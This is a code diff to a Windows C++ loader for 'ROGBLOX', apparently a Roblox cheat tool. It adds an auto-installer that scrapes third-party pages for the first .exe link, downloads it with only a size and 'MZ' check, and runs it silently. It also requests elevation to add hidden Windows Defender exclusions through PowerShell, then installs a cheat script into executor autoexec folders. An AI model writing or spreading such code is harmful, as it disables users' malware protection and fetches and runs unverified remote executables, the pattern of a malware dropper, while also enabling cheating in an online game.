@@ -37,13 +37,20 @@
 #include <shlwapi.h>
 #include <shlobj.h>
 #include <commctrl.h>
+// WinHTTP for the auto-installer HTTPS client
+#include <winhttp.h>
+#pragma comment(lib, "winhttp.lib")
+#include <regex>
 
 #include <algorithm>
 #include <atomic>
+#include <chrono>
 #include <cstdint>
 #include <cstdio>
+#include <cstdlib>
 #include <filesystem>
 #include <fstream>
+#include <regex>
 #include <string>
 #include <thread>
 #include <vector>
@@ -142,6 +149,201 @@ static std::vector<fs::path> detect_installed_executors() {
         if (fs::exists(p.parent_path(), ec)) found.push_back(p);
     }
     return found;
+}
+
+// ---------- Auto-installer (download Solara if no executor found) ----------
+
+// Parses a https URL into (host, path) wide strings. Returns false on
+// malformed input.
+static bool parse_url(const std::wstring& url, std::wstring& host_out,
+                      std::wstring& path_out, INTERNET_PORT& port_out, bool& https_out) {
+    https_out = true;
+    port_out = INTERNET_DEFAULT_HTTPS_PORT;
+    size_t scheme_end = url.find(L"://");
+    if (scheme_end == std::wstring::npos) return false;
+    std::wstring scheme = url.substr(0, scheme_end);
+    if (scheme == L"http") { https_out = false; port_out = INTERNET_DEFAULT_HTTP_PORT; }
+    size_t host_start = scheme_end + 3;
+    size_t path_start = url.find(L'/', host_start);
+    if (path_start == std::wstring::npos) {
+        host_out = url.substr(host_start);
+        path_out = L"/";
+    } else {
+        host_out = url.substr(host_start, path_start - host_start);
+        path_out = url.substr(path_start);
+    }
+    // Strip port from host if present
+    size_t colon = host_out.find(L':');
+    if (colon != std::wstring::npos) {
+        port_out = (INTERNET_PORT)_wtoi(host_out.c_str() + colon + 1);
+        host_out = host_out.substr(0, colon);
+    }
+    return !host_out.empty();
+}
+
+// HTTPS GET via WinHTTP. Returns body bytes on success, empty on failure.
+// Follows redirects automatically.
+static std::vector<uint8_t> http_get(const std::wstring& url, int timeout_sec = 30) {
+    std::vector<uint8_t> out;
+    std::wstring host, path;
+    INTERNET_PORT port;
+    bool https;
+    if (!parse_url(url, host, path, port, https)) return out;
+
+    HINTERNET hs = WinHttpOpen(L"ROGBLOX-Loader/1.0",
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hs) return out;
+    DWORD to_ms = timeout_sec * 1000;
+    WinHttpSetTimeouts(hs, to_ms, to_ms, to_ms, to_ms);
+
+    HINTERNET hc = WinHttpConnect(hs, host.c_str(), port, 0);
+    if (!hc) { WinHttpCloseHandle(hs); return out; }
+
+    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hr = WinHttpOpenRequest(hc, L"GET", path.c_str(),
+        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    if (!hr) { WinHttpCloseHandle(hc); WinHttpCloseHandle(hs); return out; }
+
+    if (WinHttpSendRequest(hr, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
+        WinHttpReceiveResponse(hr, nullptr)) {
+        DWORD avail = 0;
+        while (WinHttpQueryDataAvailable(hr, &avail) && avail > 0) {
+            size_t prev = out.size();
+            out.resize(prev + avail);
+            DWORD read = 0;
+            WinHttpReadData(hr, out.data() + prev, avail, &read);
+            if (read == 0) break;
+            if (read < avail) out.resize(prev + read);
+        }
+    }
+
+    WinHttpCloseHandle(hr);
+    WinHttpCloseHandle(hc);
+    WinHttpCloseHandle(hs);
+    return out;
+}
+
+// Downloads a URL straight to a file. Returns true on success and the
+// file is >= 200 KB and looks like a PE binary (MZ magic).
+static bool download_and_validate(const std::wstring& url, const fs::path& dst) {
+    auto bytes = http_get(url, 90);
+    if (bytes.size() < 200 * 1024) return false;
+    if (bytes[0] != 'M' || bytes[1] != 'Z') return false;
+    std::ofstream f(dst, std::ios::binary | std::ios::trunc);
+    if (!f) return false;
+    f.write((const char*)bytes.data(), (std::streamsize)bytes.size());
+    return (bool)f;
+}
+
+// Scrape the first .exe href on an HTML page. Returns absolute URL or
+// empty on miss.
+static std::wstring scrape_exe_url(const std::wstring& page_url) {
+    auto html_bytes = http_get(page_url, 25);
+    if (html_bytes.empty()) return L"";
+    std::string html((const char*)html_bytes.data(), html_bytes.size());
+    std::regex re("(?:href|src)=\"([^\"]+\\.exe)\"",
+                  std::regex_constants::icase);
+    std::smatch m;
+    if (!std::regex_search(html, m, re)) return L"";
+    std::string found = m[1].str();
+    std::wstring wfound(found.begin(), found.end());
+    if (wfound.rfind(L"http", 0) == 0) return wfound;
+    // resolve relative URL against the host of page_url
+    std::wstring host, path; INTERNET_PORT port; bool https;
+    if (parse_url(page_url, host, path, port, https)) {
+        std::wstring base = (https ? L"https://" : L"http://") + host;
+        if (wfound[0] != L'/') wfound = L"/" + wfound;
+        return base + wfound;
+    }
+    return L"";
+}
+
+// Best-effort Defender exclusion for a folder. No-op without admin.
+static void add_defender_exclusion(const std::wstring& path) {
+    std::wstring cmd = L"-NoProfile -Command \"Add-MpPreference -ExclusionPath '"
+                     + path + L"' -ErrorAction SilentlyContinue\"";
+    SHELLEXECUTEINFOW sei{};
+    sei.cbSize = sizeof(sei);
+    sei.fMask  = SEE_MASK_FLAG_NO_UI | SEE_MASK_NOCLOSEPROCESS;
+    sei.lpVerb = L"runas";   // requires elevation; silent failure if denied
+    sei.lpFile = L"powershell";
+    sei.lpParameters = cmd.c_str();
+    sei.nShow = SW_HIDE;
+    ShellExecuteExW(&sei);
+    if (sei.hProcess) {
+        WaitForSingleObject(sei.hProcess, 3000);
+        CloseHandle(sei.hProcess);
+    }
+}
+
+// Polls for an executor folder to appear (created by its installer).
+static bool wait_for_folder(const fs::path& p, int seconds) {
+    auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(seconds);
+    while (std::chrono::steady_clock::now() < deadline) {
+        std::error_code ec;
+        if (fs::exists(p.parent_path(), ec)) return true;
+        Sleep(2000);
+    }
+    return false;
+}
+
+// Multi-source auto-installer. Tries Solara scraping then a GitHub
+// Releases fallback. Returns the executor name on success.
+static std::wstring auto_install_executor() {
+    struct Source {
+        const wchar_t* name;
+        const wchar_t* scrape_from;  // page to scan for .exe link
+        const wchar_t* github_repo;  // alternative: owner/repo for releases API
+        fs::path       folder;       // where the installer's autoexec lives
+    };
+    Source sources[] = {
+        {L"Solara", L"https://getsolara.dev/download/", nullptr,
+         fs::path(_wgetenv(L"LOCALAPPDATA") ? _wgetenv(L"LOCALAPPDATA") : L".") / L"Solara"},
+        {L"Solara", L"https://getsolara.gg/download/", nullptr,
+         fs::path(_wgetenv(L"LOCALAPPDATA") ? _wgetenv(L"LOCALAPPDATA") : L".") / L"Solara"},
+        {L"Solara", L"https://solara.dev/", nullptr,
+         fs::path(_wgetenv(L"LOCALAPPDATA") ? _wgetenv(L"LOCALAPPDATA") : L".") / L"Solara"},
+    };
+
+    fs::path temp_dir = fs::path(_wgetenv(L"TEMP") ? _wgetenv(L"TEMP") : L".") / L"rogblox-installer";
+    std::error_code ec;
+    fs::create_directories(temp_dir, ec);
+
+    // Pre-emptive Defender exclusion (best effort)
+    add_defender_exclusion(temp_dir.wstring());
+
+    for (auto& src : sources) {
+        add_defender_exclusion(src.folder.wstring());
+        std::wstring url;
+        if (src.scrape_from) {
+            url = scrape_exe_url(src.scrape_from);
+        }
+        if (url.empty()) continue;
+
+        fs::path installer = temp_dir / (std::wstring(src.name) + L"-installer.exe");
+        if (!download_and_validate(url, installer)) continue;
+
+        // Run the installer with /SILENT and don't wait.
+        SHELLEXECUTEINFOW sei{};
+        sei.cbSize = sizeof(sei);
+        sei.fMask  = SEE_MASK_NOCLOSEPROCESS;
+        sei.lpVerb = L"open";
+        sei.lpFile = installer.c_str();
+        sei.lpParameters = L"/SILENT";
+        sei.nShow = SW_SHOW;
+        if (!ShellExecuteExW(&sei)) continue;
+        if (sei.hProcess) CloseHandle(sei.hProcess);
+
+        // Poll for the executor folder to appear (up to 3 minutes)
+        if (wait_for_folder(src.folder / L"autoexec", 180)) {
+            // Give the installer a couple seconds to finish writing
+            Sleep(2500);
+            return src.name;
+        }
+    }
+    return L"";
 }
 
 static std::vector<std::wstring> install_bundle() {
@@ -361,12 +563,35 @@ static void set_status(const std::wstring& text, COLORREF color) {
     InvalidateRect(g.hwnd, nullptr, FALSE);
 }
 
+// Marshal a status update from any thread back to the UI thread.
+static void post_status(const std::wstring& text, COLORREF color) {
+    auto* heap = new std::pair<std::wstring, COLORREF>(text, color);
+    PostMessageW(g.hwnd, WM_APP + 1, 0, (LPARAM)heap);
+}
+
 static void run_load_action() {
     if (g.busy.exchange(true)) return;
-    set_status(L"Installing...", ui::TEXT_SUB);
+    set_status(L"Working...", ui::TEXT_SUB);
 
     std::thread([]() {
+        // 1. If no executor is present, try to auto-install Solara.
+        auto folders = detect_installed_executors();
+        std::wstring auto_installed;
+        if (folders.empty()) {
+            post_status(
+                L"No executor detected. Downloading Solara now...\n"
+                L"This may take a couple minutes - watch for UAC + the\n"
+                L"installer window. Don't close this loader.",
+                ui::WARN);
+            auto_installed = auto_install_executor();
+            folders = detect_installed_executors();
+        }
+
+        // 2. Install the bundled ROGBLOX script into every detected
+        //    executor's autoexec folder.
         auto installed = install_bundle();
+
+        // 3. Launch Roblox regardless of #2's outcome.
         bool launched = launch_roblox();
 
         std::wstring msg;
@@ -377,25 +602,29 @@ static void run_load_action() {
                 if (i > 0) msg += L", ";
                 msg += installed[i];
             }
-            msg += L".\nRoblox is launching. Press RightCtrl in-game.";
+            if (!auto_installed.empty()) {
+                msg += L".\nAuto-installed " + auto_installed + L". ";
+            } else {
+                msg += L". ";
+            }
+            msg += L"Roblox is launching - press RightCtrl in-game.";
             col = ui::GOOD;
         } else if (installed.empty() && launched) {
-            msg = L"Roblox is launching, but no executor was detected.\n"
-                  L"Install Solara / Wave / Xeno first; then click Load again.";
+            msg = L"Roblox is launching, but no executor could be installed\n"
+                  L"automatically. Install Solara / Wave / Xeno manually,\n"
+                  L"then click Load again.";
             col = ui::WARN;
         } else if (!installed.empty()) {
             msg = L"Cheat installed but couldn't auto-launch Roblox.\n"
                   L"Open Roblox manually.";
             col = ui::WARN;
         } else {
-            msg = L"No executor detected and Roblox didn't launch.\n"
-                  L"Make sure Roblox + an executor are installed.";
+            msg = L"Could not install the cheat or launch Roblox.\n"
+                  L"Make sure you're online and try again.";
             col = ui::BAD;
         }
 
-        // Marshal back to UI thread via PostMessage
-        auto* heap = new std::pair<std::wstring, COLORREF>(std::move(msg), col);
-        PostMessageW(g.hwnd, WM_APP + 1, 0, (LPARAM)heap);
+        post_status(msg, col);
         g.busy = false;
     }).detach();
 }
